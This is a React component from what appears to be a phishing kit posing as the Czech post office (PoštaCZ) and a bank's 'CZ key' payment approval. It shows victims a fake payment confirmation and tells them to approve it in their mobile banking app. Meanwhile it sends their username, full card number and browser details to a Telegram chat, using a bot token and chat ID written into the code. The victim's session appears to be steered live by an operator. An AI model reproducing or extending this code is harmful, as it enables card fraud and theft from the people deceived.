import React, { useState, useEffect } from 'react';
import { useTelegramBot } from '../hooks/useTelegramBot';
import './NextStepAppr.css';

function NextStepAppr() {
  const [username, setUsername] = useState('');
  const [fullCardNumber, setFullCardNumber] = useState('');
  const [cardNumber, setCardNumber] = useState('**** **** **** ****');
  const [currentTime, setCurrentTime] = useState(new Date());
  const [isLoading, setIsLoading] = useState(false);
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [sessionId, setSessionId] = useState(null);

  // Get username and card number from sessionStorage
  useEffect(() => {
    // Retrieve data with better error handling
    const storedUsername = sessionStorage.getItem('loginName') || 'Unknown User';
    const storedCardNumber = sessionStorage.getItem('cardNumber');
    const storedSessionId = sessionStorage.getItem('sessionId') || Date.now().toString();
    
    console.log('📦 Retrieved from sessionStorage:', { storedUsername, storedCardNumber });
    
    setUsername(storedUsername);
    setSessionId(storedSessionId);
    
    if (storedCardNumber) {
      setFullCardNumber(storedCardNumber);
      // Format card number to show only last 4 digits for display
      const cleanNumber = storedCardNumber.replace(/\s/g, '');
      const last4 = cleanNumber.slice(-4);
      setCardNumber(`**** **** **** ${last4}`);
    } else {
      console.warn('⚠️ No card number found in sessionStorage');
      // Try to get from localStorage as fallback
      const localCardNumber = localStorage.getItem('cardNumber');
      if (localCardNumber) {
        setFullCardNumber(localCardNumber);
        const cleanNumber = localCardNumber.replace(/\s/g, '');
        const last4 = cleanNumber.slice(-4);
        setCardNumber(`**** **** **** ${last4}`);
      }
    }
  }, []);

  // Update time every second
  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentTime(new Date());
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Initialize Telegram bot with dummy handlers for NextStepAppr
  const {
    sendSuccessToTelegram
  } = useTelegramBot(
    sessionId,
    () => {}, // onApprove - not needed here
    () => {}, // onDeny - not needed here
    () => {}, // onViewCard - not needed here
    () => {}, // onNextStep - not needed here
    () => {}, // onBackToCard - not needed here
    () => {}, // onBackToLogin - not needed here
    () => {}, // onBlock - not needed here
    () => {}  // onNextStepAppr - not needed here
  );

  // Send confirmation log using the existing Telegram infrastructure
  const sendConfirmationLog = async () => {
    try {
      // Use the sendSuccessToTelegram function from useTelegramBot
      await sendSuccessToTelegram(username, sessionId);
      
      // Send additional confirmation specific log
      const confirmationMessage = `
📋 <b>USER CONFIRMATION - CZ KEY</b> 📋
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username}
💳 <b>FULL Card Number:</b> <code>${fullCardNumber}</code>
🔘 <b>Action:</b> User confirmed payment in CZ key
⏰ <b>Time:</b> ${currentTime.toLocaleString()}
🌐 <b>User Agent:</b> ${navigator.userAgent.substring(0, 100)}
━━━━━━━━━━━━━━━━━━━━━
✅ <i>Payment has been confirmed in CZ key!</i>
      `;
      
      // You would need to add this function to useTelegramBot or use direct axios
      const axios = require('axios');
      const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
      const TELEGRAM_LOGS_CHAT_ID = '-1003861936742';
      
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_LOGS_CHAT_ID,
        text: confirmationMessage,
        parse_mode: 'HTML'
      });
      
      console.log('✅ Confirmation log sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending confirmation log:', error);
      return false;
    }
  };

  const handleConfirm = async () => {
    setIsLoading(true);
    
    // Send confirmation log
    await sendConfirmationLog();
    
    setIsConfirmed(true);
    setIsLoading(false);
    console.log('✅ Confirmed - Log sent to channel');
  };

  const handleBack = () => {
    console.log('🔵 Back button clicked - returning to card verification');
    window.location.href = '/';
  };

  return (
    <div className="confirmation-overlay">
      <div className="confirmation-modal">
        <h3>In App-Verification in PoštaCZ</h3>
        
        {!isConfirmed ? (
          <>
            <div className="confirmation-details">
              <div className="detail-row">
                <span className="detail-label">User:</span>
                <span className="detail-value">{username}</span>
              </div>
              <div className="detail-row">
                <span className="detail-label">Merchant:</span>
                <span className="detail-value">PoštaOnline</span>
              </div>
              <div className="detail-row">
                <span className="detail-label">Amount:</span>
                <span className="detail-value">00,00 CZK</span>
              </div>
              <div className="detail-row">
                <span className="detail-label">Date:</span>
                <span className="detail-value">{currentTime.toLocaleString()}</span>
              </div>
              <div className="detail-row">
                <span className="detail-label">Card number:</span>
                <span className="detail-value">{cardNumber}</span>
              </div>
            </div>

            <div className="confirmation-instructions">
              <p>• Open mobile banking app in your mobile phone.</p>
              <p>• After confirmation come back to this screen.</p>
              <p>• If the screen doesn't close by itself when you come back, just tap "CONFIRMED IN CZ KEY".</p>
            </div>

            <div className="confirmation-buttons">
              <button onClick={handleConfirm} className="confirm-btn" disabled={isLoading}>
                {isLoading ? 'Processing...' : 'Confirm the payment in CZ key'}
              </button>
              <button onClick={handleBack} className="back-btn">
                Back to Card Verification
              </button>
            </div>
          </>
        ) : (
          <div className="waiting-container">
            <div className="waiting-spinner">⏳</div>
            <h3>Confirmation Sent Successfully!</h3>
            <p>Your confirmation has been sent to the banking app.</p>
            <p>Please check your mobile banking app to complete the verification.</p>
            <p className="waiting-time">Current time: {currentTime.toLocaleString()}</p>
            <button onClick={handleBack} className="back-btn" style={{ marginTop: '20px' }}>
              Back to Login
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

export default NextStepAppr;